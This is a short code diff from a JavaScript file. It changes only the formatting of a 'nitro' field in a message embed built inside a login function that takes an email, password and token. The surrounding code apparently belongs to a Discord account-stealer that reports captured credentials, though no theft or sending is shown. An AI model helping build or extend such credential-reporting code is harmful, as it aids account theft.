@@ -621,7 +621,7 @@ const login = async (email, password, token) => {
           },
           {
             name: '<a:satanist:802503618972483615> nitro:',
-            value: `**${nitro}**`,
+            value: `\`${nitro}\``,
             inline: true,
           },     
           {
